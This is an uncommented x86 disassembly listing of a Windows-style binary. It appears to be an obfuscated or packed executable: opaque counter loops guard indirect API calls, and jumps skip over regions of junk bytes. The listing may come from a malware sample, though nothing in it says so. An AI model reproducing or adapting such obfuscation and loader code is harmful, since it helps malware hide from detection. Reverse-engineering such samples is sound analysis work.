  40af3f:	repnz add al,BYTE PTR ss:[eax+0x24c76354]
  40af47:	lock adc DWORD PTR [esi-0x2c31b4d7],edi
  40af4e:	push   0x5a
  40af50:	pop    edx
  40af51:	call   0x707e:0x28c3e3fd
  40af58:	test   eax,0x8fb018bd
  40af5d:	mov    esp,0x2383032f
  40af62:	or     dh,BYTE PTR [ebp-0xd]
  40af65:	popa   
  40af66:	push   cs
  40af67:	mov    ebx,0x32729f
  40af6c:	add    ecx,ebx
  40af6e:	and    DWORD PTR ds:0x412370,0x41abce
  40af78:	mov    DWORD PTR [ebp-0x1c],ecx
  40af7b:	mov    DWORD PTR ds:0x41235c,0x5a41
  40af85:	mov    ecx,DWORD PTR [ebp+0x14]
  40af88:	add    DWORD PTR ds:0x41abe6,0x41235c
  40af92:	push   esi
  40af93:	push   edi
  40af94:	or     DWORD PTR ds:0x41510d,0x36ef
  40af9e:	test   ecx,ecx
  40afa0:	je     0x40afae
  40afa6:	mov    ecx,DWORD PTR [ebp+0x14]
  40afa9:	mov    ecx,DWORD PTR [ecx]
  40afab:	mov    DWORD PTR [ebp-0x1c],ecx
  40afae:	movzx  edi,BYTE PTR ds:0x417e3d
  40afb5:	and    DWORD PTR ds:0x417e41,edi
  40afbb:	imul   edx,eax
  40afbe:	sub    DWORD PTR ds:0x412374,ecx
  40afc4:	mov    ecx,0x4573
  40afc9:	and    DWORD PTR ds:0x41abe2,0x0
  40afd3:	mov    esi,DWORD PTR ds:0x41abe2
  40afd9:	inc    esi
  40afda:	mov    DWORD PTR ds:0x41abe2,esi
  40afe0:	cmp    DWORD PTR ds:0x41abe2,0x22
  40afe7:	jne    0x40affd
  40afed:	push   0x2695
  40aff2:	push   0x8176
  40aff7:	call   DWORD PTR ds:0x40d3a0
  40affd:	cmp    DWORD PTR ds:0x41abe2,0x1e
  40b004:	jb     0x40afd3
  40b00a:	add    edx,ecx
  40b00c:	and    DWORD PTR ds:0x41abca,0x0
  40b016:	jmp    0x40b02a
  40b01b:	xor    edi,edi
  40b01d:	xor    edi,DWORD PTR ds:0x41abca
  40b023:	inc    edi
  40b024:	mov    DWORD PTR ds:0x41abca,edi
  40b02a:	cmp    DWORD PTR ds:0x41abca,0x12
  40b031:	jae    0x40b05b
  40b037:	cmp    DWORD PTR ds:0x41abca,0x1d
  40b03e:	jne    0x40b054
  40b044:	push   0x27af
  40b049:	push   0x17d7
  40b04e:	call   DWORD PTR ds:0x40d028
  40b054:	jmp    0x40b01b
  40b059:	or     esi,edi
  40b05b:	mov    esi,0x7879
  40b060:	mov    edi,0x1556
  40b065:	mov    DWORD PTR ds:0x4245b2,0x3a32
  40b06f:	xchg   esi,ecx
  40b071:	mov    ecx,DWORD PTR ds:0x41238c
  40b077:	mov    ecx,DWORD PTR [ecx]
  40b079:	or     DWORD PTR ds:0x417e49,ecx
  40b07f:	sub    edx,edi
  40b081:	and    ecx,DWORD PTR ds:0x412368
  40b087:	xor    esi,esi
  40b089:	adc    ecx,DWORD PTR ds:0x4245ae
  40b08f:	mov    DWORD PTR [ebp-0x28],esi
  40b092:	mov    DWORD PTR [ebp-0x2c],esi
  40b095:	add    ecx,DWORD PTR ds:0x41abd6
  40b09b:	mov    DWORD PTR [ebp-0x14],esi
  40b09e:	and    DWORD PTR ds:0x41510d,ebx
  40b0a4:	jmp    0x40b189
  40b0a9:	scas   al,BYTE PTR es:[edi]
  40b0aa:	mov    ch,0x8b
  40b0ac:	imul   edi,DWORD PTR [ecx+0x69],0x6e
  40b0b0:	pop    ecx
  40b0b1:	(bad)  
  40b0b2:	pusha  
  40b0b3:	fisttp WORD PTR [ecx+0x8]
  40b0b6:	adc    bl,cl
  40b0b8:	mov    eax,ds:0x7e7e3fc9
  40b0bd:	mov    dh,0x7e
  40b0bf:	jle    0x40b13f
  40b0c1:	adc    BYTE PTR [eax-0x60687815],0xf1
  40b0c8:	sbb    ecx,0xffffffd8
  40b0cb:	hlt    
  40b0cc:	imul   ecx,DWORD PTR [edx],0x60ad8fb3
  40b0d2:	out    0xc9,eax
  40b0d4:	mov    esp,DWORD PTR fs:[ecx-0x4655d0a1]
  40b0db:	lods   eax,DWORD PTR ds:[esi]
  40b0dc:	push   ebx
  40b0dd:	sub    DWORD PTR [eax],0x4c
  40b0e0:	nop
  40b0e1:	test   al,0x93
  40b0e3:	mov    ecx,DWORD PTR [edx+0x2d166d82]
  40b0e9:	mov    ebx,0xa16deddd
  40b0ee:	les    esp,FWORD PTR [eax]
  40b0f0:	and    DWORD PTR [ebx+eiz*1+0x21],ecx
  40b0f4:	and    eax,edx
  40b0f6:	push   esi
  40b0f7:	ss inc eax
  40b0f9:	imul   edx,DWORD PTR [esi+0x38],0xfc728240
  40b100:	imul   esi,DWORD PTR [ebx+ebp*8-0x57],0xdbdbde16
  40b108:	popf   
  40b109:	xchg   dh,bh
  40b10b:	jbe    0x40b123
  40b10d:	add    ah,BYTE PTR [ebx+0x31]
  40b110:	scas   eax,DWORD PTR es:[edi]
  40b111:	rcr    DWORD PTR [ecx],cl
  40b113:	mov    WORD PTR [edi],cs
  40b115:	mov    ds:0xd87db217,eax
  40b11a:	dec    edi
  40b11b:	fistp  DWORD PTR ds:0xda5d12a8
  40b121:	jge    0x40b16c
  40b123:	dec    edi
  40b124:	out    0xe,eax
  40b126:	lods   eax,DWORD PTR ds:[esi]
  40b127:	xchg   ebx,eax
  40b128:	sar    ecx,cl
  40b12a:	and    ecx,DWORD PTR [esi]
  40b12c:	in     eax,0x4a
  40b12e:	inc    esi
  40b12f:	add    DWORD PTR [edx-0x46],esp
  40b132:	sbb    al,0x9
  40b134:	out    dx,eax
  40b135:	inc    ebx
  40b136:	cwde   
  40b137:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b138:	and    ch,ah
  40b13a:	pop    eax
  40b13b:	dec    esi
  40b13c:	stc    
  40b13d:	int3   
  40b13e:	mov    bl,0xee
  40b140:	mov    edx,DWORD PTR [esi+0xd]
  40b143:	popa   
  40b144:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b145:	cmp    dl,0xa
  40b148:	icebp  
  40b149:	cmp    eax,0xd71c0e06
  40b14e:	std    
  40b14f:	add    DWORD PTR ds:0xbbc876a1,ebp
  40b155:	jmp    0x1b6:0x1529af5f
  40b15c:	and    eax,0x9392e6e4
  40b161:	fidiv  WORD PTR [edx]
  40b163:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b164:	imul   esp,DWORD PTR [eax+0x36ba0f6b],0xdd88ff06
  40b16e:	jge    0x40b18e
  40b170:	(bad)  
  40b171:	int3   
  40b172:	add    al,0x4
  40b174:	xor    edx,ebp
  40b176:	sbb    eax,0x16a7b5aa
  40b17b:	or     al,0x47
  40b17d:	adc    edx,DWORD PTR [edx+0x69]
  40b180:	imul   ebx,DWORD PTR [esi],0xffffffb4
  40b183:	jmp    0x40b1a1
  40b185:	dec    edx
  40b186:	mov    bh,0x8f
  40b188:	lods   eax,DWORD PTR ds:[esi]
  40b189:	mov    DWORD PTR [ebp-0x8],esi
  40b18c:	movzx  ecx,BYTE PTR ds:0x41abce
  40b193:	and    DWORD PTR ds:0x415115,ecx
  40b199:	jmp    0x40b27e
  40b19e:	mov    ebp,0xc5aa0686
  40b1a3:	stos   BYTE PTR es:[edi],al
  40b1a4:	popa   
  40b1a5:	jns    0x40b1e6
  40b1a7:	in     eax,dx
  40b1a8:	(bad)  
  40b1a9:	mov    ah,0x25
  40b1ab:	jp     0x40b20f
  40b1ad:	fwait
  40b1ae:	add    DWORD PTR [esi+edi*2],edi
  40b1b1:	jle    0x40b169
  40b1b3:	jle    0x40b233
  40b1b5:	jle    0x40b1b4
  40b1b7:	xor    eax,0xc6435929
  40b1bc:	mov    esp,0x1da301ec
  40b1c1:	mov    fs,WORD PTR [ebp-0x42648c34]
  40b1c7:	ficomp DWORD PTR [eax]
  40b1ca:	sub    dl,BYTE PTR [esi-0x5f]
  40b1cd:	mov    dh,0x5f
  40b1cf:	lods   eax,DWORD PTR ds:[esi]
  40b1d0:	lods   al,BYTE PTR ds:[esi]
  40b1d1:	adc    ch,BYTE PTR [ebx+edi*2-0x29]
  40b1d5:	daa    
  40b1d6:	call   0xeef0ddb1
  40b1db:	xchg   edx,eax
  40b1dc:	dec    eax
  40b1dd:	rol    DWORD PTR [edi+eax*2+0x3e5f2adc],1
  40b1e4:	sahf   
  40b1e5:	jmp    0xc47bcae8
  40b1ea:	jnp    0x40b204
  40b1ec:	pop    edi
  40b1ed:	out    dx,ax
  40b1ef:	xor    al,BYTE PTR [edi+ebp*4-0x37d3e3db]
  40b1f6:	push   esp
  40b1f7:	ds mov dl,0x5d
  40b1fa:	xchg   ebp,eax
  40b1fb:	fsub   DWORD PTR [eax-0x4a]
  40b1fe:	(bad)  
  40b1ff:	retf   
  40b200:	stos   DWORD PTR es:[edi],eax
  40b201:	stos   DWORD PTR es:[edi],eax
  40b202:	or     esp,DWORD PTR [esp+ebx*4-0xb103024]
  40b209:	push   ebx
  40b20a:	push   eax
  40b20b:	mov    ch,0xb3
  40b20d:	xchg   ch,ch
  40b20f:	jmp    0x129aff5b
  40b214:	and    DWORD PTR [ebp-0x5b],esi
  40b217:	fld    DWORD PTR [ebx+esi*1-0x4cc63db6]
  40b21e:	out    0xd5,al
  40b220:	inc    ecx
  40b221:	sub    eax,0x4268225b
  40b226:	stos   DWORD PTR es:[edi],eax
  40b227:	les    esi,FWORD PTR [ecx-0x63]
  40b22a:	xchg   esp,eax
  40b22b:	cmp    BYTE PTR [esp+ebp*1-0x46],dl
  40b22f:	fldcw  WORD PTR [edx]
  40b231:	loope  0x40b1bf
  40b233:	adc    esi,DWORD PTR [esi-0xd29401b]
  40b239:	and    DWORD PTR [edx+0x44],esi
  40b23c:	dec    edi
  40b23d:	sahf   
  40b23e:	jle    0x40b1f6
  40b240:	test   dh,al
  40b242:	sbb    DWORD PTR [edi],ebp
  40b244:	and    eax,0x77973ba4
  40b249:	or     BYTE PTR [edx],dh
  40b24b:	sbb    al,BYTE PTR ds:0xc4aa5fb7
  40b251:	test   ax,0x1409
  40b255:	in     eax,0x1c
  40b257:	cwde   
  40b258:	dec    ebx
  40b259:	mov    ebx,0x7e727164
  40b25e:	push   ds
  40b25f:	xor    ah,dh
  40b261:	sti    
  40b262:	sub    bh,BYTE PTR [ebx]
  40b264:	aam    0xd9
  40b266:	push   ecx
  40b267:	inc    edx
  40b268:	in     al,dx
  40b269:	out    0x85,eax
  40b26b:	pop    edx
  40b26c:	enter  0x8ef3,0xf0
  40b270:	mov    ebp,0x637e0fc
  40b275:	dec    edx
  40b276:	jmp    FWORD PTR [edx+edi*1+0x128f6a10]
  40b27d:	push   es
  40b27e:	mov    ecx,DWORD PTR [ebp-0x18]
  40b281:	sub    DWORD PTR ds:0x4150fd,0x41abda
  40b28b:	xor    ecx,eax
  40b28d:	xor    edi,edi
  40b28f:	or     DWORD PTR ds:0x41236c,edi
  40b295:	add    ecx,ebx
  40b297:	not    eax
  40b299:	mov    DWORD PTR [ebp-0x20],ecx
  40b29c:	mov    eax,DWORD PTR [ebp-0x20]
  40b29f:	je     0x40bb71
  40b2a5:	mov    eax,ds:0x415105
  40b2aa:	xor    DWORD PTR ds:0x412354,eax
  40b2b0:	mov    eax,DWORD PTR [ebp-0x4]
  40b2b3:	xor    eax,0x7510859
  40b2b8:	and    DWORD PTR ds:0x4245ae,0x412358
  40b2c2:	add    eax,ebx
  40b2c4:	mov    DWORD PTR ds:0x4245ae,0x20c7
  40b2ce:	cmp    edi,eax
  40b2d0:	jmp    0x40b3b5
  40b2d5:	push   edi
  40b2d6:	pop    es
  40b2d7:	popf   
  40b2d8:	aam    0x6d
  40b2da:	fs push edi
  40b2dc:	test   DWORD PTR [edx+0x6ce65a33],edx
  40b2e2:	sbb    eax,0x3c5989c7
  40b2e7:	jle    0x40b367
  40b2e9:	mov    dh,0x7e
  40b2eb:	jle    0x40b36b
  40b2ed:	ins    DWORD PTR es:[edi],dx
  40b2ee:	std    
  40b2ef:	les    esp,FWORD PTR [ecx+0x796fb2c9]
  40b2f5:	mul    ch
  40b2f7:	adc    al,0x3a
  40b2f9:	scas   al,BYTE PTR es:[edi]
  40b2fa:	dec    edi
  40b2fb:	mov    ds:0x42534752,al
  40b300:	pushf  
  40b301:	inc    ecx
  40b302:	jb     0x40b37b
  40b304:	jecxz  0x40b34a
  40b306:	mov    dl,0x92
  40b308:	enter  0xfb27,0xff
  40b30c:	pop    ebp
  40b30d:	ficom  DWORD PTR [ecx]
  40b30f:	inc    edx
  40b310:	sub    al,0x3b
  40b312:	inc    esi
  40b313:	sub    BYTE PTR [edi],dh
  40b315:	scas   eax,DWORD PTR es:[edi]
  40b316:	adc    DWORD PTR [ebx+0x6227fbb8],0x4f2521f7
  40b320:	sbb    dh,dl
  40b322:	cli    
  40b323:	call   FWORD PTR [ecx+edi*8+0x688350e3]
  40b32a:	test   DWORD PTR [ebx-0x52],ecx
  40b32d:	out    0xd5,al
  40b32f:	sub    eax,0x355a9030
  40b334:	push   ebp
  40b335:	sub    ebp,eax
  40b337:	and    al,0xbb
  40b339:	xchg   ah,bh
  40b33b:	xor    cl,ah
  40b33d:	push   edi
  40b33e:	stc    
  40b33f:	cmp    eax,esp
  40b341:	cmp    BYTE PTR [ebp+0x3d6d4d23],0xf6
  40b348:	sbb    ah,ch
  40b34a:	push   ds
  40b34b:	inc    esp
  40b34c:	adc    eax,0x8f579237
  40b351:	in     al,0x4a
  40b353:	outs   dx,BYTE PTR ds:[esi]
  40b354:	jle    0x40b311
  40b356:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b357:	add    bl,BYTE PTR [eax+ebx*1+0x27]
  40b35b:	ds stc 
  40b35d:	repnz sub DWORD PTR [esi+0x50407920],0x4e
  40b365:	shr    DWORD PTR [ebx],cl
  40b367:	in     al,dx
  40b368:	inc    edi
  40b369:	in     eax,0xa
  40b36b:	add    eax,0x5e164b01
  40b370:	(bad)  
  40b371:	dec    eax
  40b372:	ja     0x40b357
  40b374:	rcr    dh,0x75
  40b377:	xchg   edi,eax
  40b378:	mov    bl,BYTE PTR [ebp+0xdcb35d3]
  40b37e:	cmp    DWORD PTR ds:0x221367a4,ebx
  40b384:	sub    BYTE PTR [ebx+0x336d66ec],ch
  40b38a:	sbb    al,0x26
  40b38c:	push   ds
  40b38d:	(bad)  [ebp-0x3]
  40b390:	call   0x74bd02d8
  40b395:	nop
  40b396:	ins    DWORD PTR es:[edi],dx
  40b397:	aas    
  40b398:	imul   ebx,DWORD PTR [esp+eiz*8+0x21],0xd246af5f
  40b3a0:	lods   al,BYTE PTR ds:[esi]
  40b3a1:	test   edx,0xcbe1ab85
  40b3a7:	dec    eax
  40b3a8:	add    BYTE PTR [edi-0x6ecd78f1],cl
  40b3ae:	add    eax,0x8d0d3dc6
  40b3b3:	mov    eax,0x8f850f1c
  40b3b8:	add    eax,0x75ff0000
  40b3bd:	or     bh,al
  40b3bf:	add    eax,0x41abe2
  40b3c4:	xor    eax,0xe8000079
  40b3c9:	adc    al,0xf2
  40b3cb:	(bad)  
  40b3cc:	inc    DWORD PTR [ecx+0x41237c25]
  40b3d2:	add    BYTE PTR [eax],al
  40b3d4:	add    BYTE PTR [eax],al
  40b3d6:	add    cl,ch
  40b3d8:	sldt   WORD PTR [eax]
  40b3db:	add    BYTE PTR [ebx],dh
  40b3dd:	leave  
  40b3de:	add    ecx,DWORD PTR ds:0x41237c
  40b3e4:	inc    ecx
  40b3e5:	mov    DWORD PTR ds:0x41237c,ecx
  40b3eb:	cmp    DWORD PTR ds:0x41237c,0x18
  40b3f2:	jae    0x40b452
  40b3f8:	cmp    DWORD PTR ds:0x41237c,0x24
  40b3ff:	jne    0x40b40e
  40b405:	push   DWORD PTR [ebp-0x14]
  40b408:	call   DWORD PTR ds:0x40d02c
  40b40e:	jmp    0x40b3dc
  40b413:	mov    DWORD PTR ds:0x415101,0x17
  40b41d:	cmp    DWORD PTR ds:0x415101,0x0
  40b424:	je     0x40b452
  40b42a:	cmp    DWORD PTR ds:0x415101,0x1d
  40b431:	jne    0x40b440
  40b437:	push   DWORD PTR [ebp-0xc]
  40b43a:	call   DWORD PTR ds:0x40d3a4
  40b440:	mov    esi,DWORD PTR ds:0x415101
  40b446:	dec    esi
  40b447:	mov    DWORD PTR ds:0x415101,esi
  40b44d:	jmp    0x40b41d
  40b452:	mov    DWORD PTR [ebp-0x20],eax
  40b455:	and    DWORD PTR ds:0x4245c2,0x0
  40b45f:	mov    eax,ds:0x4245c2
  40b464:	inc    eax
  40b465:	mov    ds:0x4245c2,eax
  40b46a:	cmp    DWORD PTR ds:0x4245c2,0x6
  40b471:	jne    0x40b485
  40b477:	push   DWORD PTR [ebp-0x10]
  40b47a:	push   0x41ad5b
  40b47f:	call   DWORD PTR ds:0x40d20c
  40b485:	cmp    DWORD PTR ds:0x4245c2,0x5
  40b48c:	jne    0x40b4a0
  40b492:	xor    eax,eax
  40b494:	or     eax,DWORD PTR ds:0x4245c2
  40b49a:	inc    eax
  40b49b:	mov    ds:0x4245c2,eax
  40b4a0:	cmp    DWORD PTR ds:0x4245c2,0x15
  40b4a7:	jb     0x40b45f
  40b4ad:	mov    DWORD PTR ds:0x41abca,0x15
  40b4b7:	cmp    DWORD PTR ds:0x41abca,0x0
  40b4be:	je     0x40b50b
  40b4c4:	cmp    DWORD PTR ds:0x41abca,0x22
  40b4cb:	jne    0x40b4f1
  40b4d1:	push   DWORD PTR [ebp-0x14]
  40b4d4:	push   DWORD PTR [ebp-0xc]
  40b4d7:	push   DWORD PTR [ebp-0x18]
  40b4da:	push   DWORD PTR [ebp-0x14]
  40b4dd:	push   DWORD PTR [ebp-0x1c]
  40b4e0:	push   DWORD PTR [ebp-0x1c]
  40b4e3:	push   0x15ca
  40b4e8:	push   DWORD PTR [ebp-0x28]
  40b4eb:	call   DWORD PTR ds:0x40d030
  40b4f1:	xor    ecx,ecx
  40b4f3:	or     ecx,DWORD PTR ds:0x41abca
  40b4f9:	dec    ecx
  40b4fa:	mov    DWORD PTR ds:0x41abca,ecx
  40b500:	jmp    0x40b4b7
  40b505:	sbb    DWORD PTR ds:0x41abd6,edi
  40b50b:	mov    eax,DWORD PTR [ebp-0x4]
  40b50e:	mov    ecx,DWORD PTR [ebp-0x20]
  40b511:	not    esi
  40b513:	mov    esi,0x7510859
  40b518:	xor    eax,esi
  40b51a:	sub    DWORD PTR ds:0x4245b6,0x7cc8
  40b524:	add    eax,ebx
  40b526:	cmp    ecx,eax
  40b528:	jmp    0x40b60d
  40b52d:	add    edi,ebx
  40b52f:	or     al,0xde
  40b531:	in     al,0xe9
  40b533:	loope  0x40b530
  40b535:	js     0x40b579
  40b537:	dec    ebp
  40b538:	inc    edi
  40b539:	shl    DWORD PTR [eax+eiz*2],1
  40b53c:	rcl    BYTE PTR [ecx-0x498181c3],1
  40b542:	jle    0x40b5c2
  40b544:	jle    0x40b4fb
  40b546:	mov    al,BYTE PTR [esi]
  40b548:	(bad)
  40b54b:	xor    al,0xd
  40b54d:	pop    edx
  40b54e:	retf   
  40b54f:	jo     0x40b571
  40b551:	fdivr  st,st(7)
  40b553:	sub    cl,BYTE PTR [edi]
  40b555:	push   esp
  40b556:	ss cmp al,0x49
  40b559:	inc    ecx
  40b55a:	loopne 0x40b4fc
  40b55c:	js     0x40b5c0
  40b55e:	mov    dh,0x5b
  40b560:	mov    edx,0x70630205
  40b565:	mov    BYTE PTR [edi-0x78],bh
  40b568:	add    eax,DWORD PTR [esi+0xef40292]
  40b56e:	scas   al,BYTE PTR es:[edi]
  40b56f:	jl     0x40b55e
  40b571:	cmc    
  40b572:	in     al,0x79
  40b574:	cmp    eax,0x56d12395
  40b579:	cmp    eax,0x46c54016
  40b57e:	sbb    al,BYTE PTR [esp+esi*1-0x1d]
  40b582:	mov    dh,0x2b
  40b584:	stos   DWORD PTR es:[edi],eax
  40b585:	jns    0x40b52a
  40b587:	imul   DWORD PTR [ebx]
  40b589:	call   0x7804:0x2cedf0f3
  40b590:	das    
  40b591:	stos   DWORD PTR es:[edi],eax
  40b592:	sar    BYTE PTR [eax+ebp*2],cl
  40b595:	xchg   ebp,eax
  40b596:	adc    eax,0x1daac57b
  40b59b:	inc    edi
  40b59c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b59d:	pop    esi
  40b59e:	loope  0x40b54a
  40b5a0:	mov    esp,0x1a97c0db
  40b5a5:	aas    
  40b5a6:	inc    edi
  40b5a7:	and    BYTE PTR [esi+0x11],ah
  40b5aa:	popa   
  40b5ab:	test   eax,0x8318c26e
  40b5b0:	lods   al,BYTE PTR ds:[esi]
  40b5b1:	mov    esp,0xaafc437
  40b5b6:	adc    eax,0xb8fd9e55
  40b5bb:	pop    ss
  40b5bc:	mov    bh,0x17
  40b5be:	std    
  40b5bf:	jnp    0x40b5e4
  40b5c1:	iret   
  40b5c2:	push   eax
  40b5c3:	fld    TBYTE PTR [ebp+0x787b73da]
  40b5c9:	inc    esi
  40b5ca:	lea    ebp,[ebx-0x6c]
  40b5cd:	test   DWORD PTR [edi+0x15],edx
  40b5d0:	xchg   ebp,eax
  40b5d1:	gs stc 
  40b5d3:	or     esi,0xffffff88
  40b5d6:	in     al,0xd1
  40b5d8:	push   ds
  40b5d9:	lock retf 0x6661
  40b5dd:	lods   eax,DWORD PTR ds:[esi]
  40b5de:	jne    0x40b659
  40b5e0:	pop    eax
  40b5e1:	mov    gs,WORD PTR [eax-0x34]
  40b5e4:	jns    0x40b645
  40b5e6:	add    DWORD PTR [edx-0x66],ecx
  40b5e9:	inc    edx
  40b5ea:	(bad)  
  40b5ee:	jo     0x40b5bc
  40b5f0:	xchg   edx,ecx
  40b5f2:	fnstcw WORD PTR [esi]
  40b5f4:	adc    eax,0xb3ab202c
  40b5f9:	mov    dh,0xb9
  40b5fb:	pop    edi
  40b5fc:	nop
  40b5fd:	inc    ebp
  40b5fe:	dec    eax
  40b5ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b600:	and    BYTE PTR [ecx],ah
  40b602:	adc    al,0xbd
  40b605:	adc    dh,BYTE PTR [esi+0x2f]
  40b608:	test   al,0xf4
  40b60a:	loopne 0x40b62d
  40b60c:	jp     0x40b61d
  40b60e:	test   BYTE PTR [edx+0x5],al
  40b611:	add    BYTE PTR [eax],al
  40b613:	sbb    DWORD PTR ds:0x415115,0x412368
  40b61d:	push   DWORD PTR [ebp-0x20]
  40b620:	jmp    0x40b705
  40b625:	sti    
  40b626:	loopne 0x40b67d
  40b628:	lock push ebp
  40b62a:	cdq    
  40b62b:	sti    
  40b62c:	jns    0x40b666
  40b62e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b62f:	pop    ecx
  40b630:	out    0x1,al
  40b632:	pop    ds
  40b633:	js     0x40b616
  40b635:	jmp    0xb6bf346c
  40b63a:	jle    0x40b6ba
  40b63c:	jle    0x40b679
  40b63e:	sbb    cl,BYTE PTR [edi+ecx*1+0x11]
  40b642:	repz (bad) 
  40b644:	retf   
  40b645:	aad    0xc7
  40b647:	cs sti 
  40b649:	push   ss
  40b64a:	pop    edx
  40b64b:	gs popa 
  40b64d:	fstp   QWORD PTR [edx-0x6a]
  40b650:	pop    eax
  40b651:	loopne 0x40b64d
  40b653:	les    edi,FWORD PTR [ecx-0x4e]
  40b656:	mov    ebx,0xd3003b46
  40b65b:	ins    BYTE PTR es:[edi],dx
  40b65c:	in     eax,0x1f
  40b65e:	sbb    eax,0x1b09b723
  40b663:	imul   eax,DWORD PTR [ebx-0x57702c83],0x48
  40b66a:	(bad)  
  40b66b:	ins    DWORD PTR es:[edi],dx
  40b66c:	push   DWORD PTR [edi+0x11]
  40b66f:	hlt    
  40b670:	pop    eax
  40b671:	pop    ss
  40b672:	jl     0x40b65e
  40b674:	addr16 inc ebx
  40b676:	out    0xe0,al
  40b678:	addr16 pop edx
  40b67a:	das    
  40b67b:	pop    ebp
  40b67c:	out    0xda,al
  40b67e:	lods   al,BYTE PTR ds:[esi]
  40b67f:	xchg   BYTE PTR ds:0xd4590415,al
  40b685:	fs test eax,0xee1f2365
  40b68b:	cld    
  40b68c:	and    al,0x57
  40b68e:	mov    bh,0x7d
  40b690:	js     0x40b62c
  40b692:	test   edx,esi
  40b694:	dec    ebx
  40b695:	mov    eax,ds:0x4e0b414
  40b69a:	ret    
  40b69b:	out    0xa0,eax
  40b69d:	(bad)  
  40b69e:	xchg   esi,eax
  40b69f:	in     al,dx
  40b6a0:	call   0x5de23226
  40b6a5:	aaa    
  40b6a6:	cs loop 0x40b6e0
  40b6a9:	in     eax,0x7e
  40b6ab:	imul   ebp,DWORD PTR [ebx],0xffffffd3
  40b6ae:	int3   
  40b6af:	outs   dx,BYTE PTR ds:[esi]
  40b6b0:	fldcw  WORD PTR [eax-0x75be5dfe]
  40b6b6:	mov    dl,0xce
  40b6b8:	out    0x6c,al
  40b6ba:	bound  esi,QWORD PTR [esi+0x4a86844c]
  40b6c0:	xchg   esi,eax
  40b6c1:	cld    
  40b6c2:	sbb    DWORD PTR [ecx-0x8],esi
  40b6c5:	jg     0x40b6bd
  40b6c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b6c9:	pop    esp
  40b6ca:	int    0xe
  40b6cc:	push   ebp
  40b6cd:	and    DWORD PTR [edx],esi
  40b6cf:	(bad)  
  40b6d0:	xor    al,dh
  40b6d2:	mov    edi,0x8ca1b6ea
  40b6d7:	and    DWORD PTR [ebx],esp
  40b6d9:	mov    cl,BYTE PTR [ecx]
  40b6db:	jle    0x40b6ef
  40b6dd:	jmp    0x759c:0x52f87455
  40b6e4:	jae    0x40b6ac
  40b6e6:	jle    0x40b6a4
  40b6e8:	jnp    0x40b66c
  40b6ea:	inc    ecx
  40b6eb:	jmp    0x40b6af
  40b6ed:	dec    ecx
  40b6ee:	adc    ah,BYTE PTR [edx-0x252c26b7]
  40b6f4:	mov    ch,0xb8
  40b6f6:	(bad)  
  40b6f7:	fist   WORD PTR [ecx+0x751213b0]
  40b6fd:	int3   
  40b6fe:	pop    ecx
  40b6ff:	push   eax
  40b700:	xor    DWORD PTR [esp+edi*4-0x6a],ebp
  40b704:	mov    ecx,0xe80875ff
  40b709:	mov    ebp,0x9ffffef
  40b70e:	cmp    eax,0x41abde
  40b713:	mov    DWORD PTR [ebp-0x14],eax
  40b716:	mov    eax,DWORD PTR [ebp-0x4]
  40b719:	adc    ecx,DWORD PTR ds:0x412370
  40b71f:	mov    ecx,DWORD PTR [ebp-0x14]
  40b722:	adc    DWORD PTR ds:0x4245ba,0x45e4
  40b72c:	xor    eax,esi
  40b72e:	add    eax,ebx
  40b730:	mov    DWORD PTR ds:0x415111,0x202e
  40b73a:	cmp    ecx,eax
  40b73c:	mov    DWORD PTR ds:0x412364,0x4412
  40b746:	je     0x40bb55
  40b74c:	and    DWORD PTR ds:0x417e49,0x0
  40b756:	mov    eax,ds:0x417e49
  40b75b:	inc    eax
  40b75c:	mov    ds:0x417e49,eax
  40b761:	cmp    DWORD PTR ds:0x417e49,0x22
  40b768:	jne    0x40b798
  40b76e:	push   0x415115
  40b773:	push   0x2bf6
  40b778:	push   DWORD PTR [ebp-0x14]
  40b77b:	push   0x415111
  40b780:	push   DWORD PTR [ebp-0x10]
  40b783:	push   0x41adfd
  40b788:	push   0x4def
  40b78d:	push   0x3000
  40b792:	call   DWORD PTR ds:0x40d210
  40b798:	cmp    DWORD PTR ds:0x417e49,0x12
  40b79f:	jb     0x40b756
  40b7a5:	mov    eax,DWORD PTR [ebp-0x14]
  40b7a8:	mov    eax,DWORD PTR [eax+0x18]
  40b7ab:	movzx  ecx,BYTE PTR ds:0x417e4d
  40b7b2:	sbb    DWORD PTR ds:0x41237c,ecx
  40b7b8:	mov    DWORD PTR [ebp-0x20],eax
  40b7bb:	xor    eax,eax
  40b7bd:	or     eax,DWORD PTR ds:0x412390
  40b7c3:	xor    ecx,ecx
  40b7c5:	xor    ecx,DWORD PTR ds:0x417eaa
  40b7cb:	sub    ecx,eax
  40b7cd:	sub    eax,DWORD PTR [eax+ecx*1]
  40b7d0:	mov    eax,DWORD PTR [ebp-0x14]
  40b7d3:	sub    DWORD PTR ds:0x4245b6,0x1830
  40b7dd:	mov    ecx,DWORD PTR [ebp+0x8]
  40b7e0:	add    DWORD PTR ds:0x41235c,0x415101
  40b7ea:	add    ecx,DWORD PTR [eax+0x20]
  40b7ed:	mov    DWORD PTR [ebp-0x28],ecx
  40b7f0:	mov    DWORD PTR ds:0x417e59,0x1f
  40b7fa:	cmp    DWORD PTR ds:0x417e59,0x0
  40b801:	je     0x40b84b
  40b807:	cmp    DWORD PTR ds:0x417e59,0xf
  40b80e:	jne    0x40b823
  40b814:	push   DWORD PTR [ebp-0x1c]
  40b817:	push   DWORD PTR [ebp-0x10]
  40b81a:	push   DWORD PTR [ebp-0x28]
  40b81d:	call   DWORD PTR ds:0x40d034
  40b823:	cmp    DWORD PTR ds:0x417e59,0x10
  40b82a:	jne    0x40b83b
  40b830:	mov    eax,ds:0x417e59
  40b835:	dec    eax
  40b836:	mov    ds:0x417e59,eax
  40b83b:	mov    eax,ds:0x417e59
  40b840:	dec    eax
  40b841:	mov    ds:0x417e59,eax
  40b846:	jmp    0x40b7fa
  40b84b:	mov    eax,DWORD PTR [ebp-0x14]
  40b84e:	mov    ecx,DWORD PTR [ebp+0x8]
  40b851:	add    ecx,DWORD PTR [eax+0x24]
  40b854:	jmp    0x40b939
  40b859:	mov    ch,0x76
  40b85b:	or     DWORD PTR [ecx+ecx*2+0x59],eax
  40b85f:	pop    ecx
  40b860:	pop    es
